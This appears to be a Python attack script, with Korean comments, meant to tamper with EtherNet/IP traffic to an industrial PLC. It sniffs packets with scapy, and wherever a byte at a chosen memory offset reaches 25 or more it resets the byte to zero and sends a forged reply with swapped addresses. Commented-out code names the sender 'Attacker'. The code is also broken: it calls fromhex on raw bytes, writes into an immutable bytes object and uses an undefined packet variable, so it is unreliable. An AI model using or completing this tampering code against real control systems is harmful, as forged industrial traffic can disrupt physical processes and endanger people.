#Rule 1

import binascii
import socket
import json
import cip
from scapy.all import *


# Ethernet/IP/TCP 패킷
# class packetparsing(Packet):
#     name = "Ethernet/IP"
#     fields_desc = [
#         XByteField("services", 0x02),  # Register Session
#         XByteField("command", 0x70),   # Send RR Data
#         XShortField("length", None),   # To be filled
#         StrField("session_handle", b"\x00\x00\x00\x00"),
#         XShortField("status", 0x00),
#         XShortField("context", 0x00),
#         IntField("options", 0x00000000),
#         XByteField("interface_handle", 0x00),
#         XByteField("timeout", 0x0A),
#         XByteField("item_count", 0x02),
#         XShortField("item_length", None),  # To be filled
#         XByteField("address_type", 0x00),  # Null Address
#         XShortField("address_length", 0x00),  # 0 length for null address
#         XIntField("address", 0x00000000),  # PLC 주소 설정 (여기에 PLC 주소를 정수로 입력)
#     ]

def packet_callback(packet):
    if TCP in packet and Raw in packet:
        # TCP 헤더와 Raw 데이터 추출
        tcp_header = packet[TCP]
        raw_data = packet[Raw].load

        # Raw 데이터를 바이트열로 변환
        data_bytes = bytes.fromhex(raw_data)

        # 원하는 메모리 영역의 위치
        memory_offset = 28  # 예시로 28로 설정

        # 조건 확인: 메모리 영역의 값이 25 이상이면 수정
        if len(data_bytes) > memory_offset and data_bytes[memory_offset] >= 25:
            # 메모리 영역의 값을 0으로 설정
            data_bytes[memory_offset] = 0

            # 수정된 데이터를 다시 패킷으로 포장
            modified_data = data_bytes.hex()

            # 수정된 패킷 생성
            new_packet = IP(dst=packet[IP].src, src=packet[IP].dst) / TCP(dport=packet[TCP].sport, sport=packet[TCP].dport) / Raw(load=modified_data)

            # 수정된 패킷 전송
            send(new_packet)

def main():
    server_ip = '127.0.0.1'  # 서버 IP (서버와 동일한 IP)
    server_port = 8000  # 서버 포트 (서버와 동일한 포트)

    # 소켓 생성 및 서버에 연결
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))
    
    # 패킷을 받아들이고 출력
    sniff(iface="eth0", prn=lambda x: x.show())

    # 전송할 데이터 생성 -> scapy이용
    # data_to_send = {
    #     'message': '안녕하세요, PLC!',
    #     'user_id': 'Attacker'
    # }

    # 데이터를 JSON 형식으로 인코딩하여 서버로 전송
    # data_to_send_str = json.dumps(data_to_send)
    # client_socket.send(data_to_send_str.encode('utf-8'))

    packet_callback(packet);

    # 서버로부터 응답 수신
    response_data = client_socket.recv(4096)  # 4096 바이트씩 데이터를 수신
    if response_data:
        decoded_response = json.loads(response_data.decode('utf-8'))
        print("서버 응답:", decoded_response)

    # 클라이언트 소켓 종료
    client_socket.close()

if __name__ == '__main__':
    main()
    
    
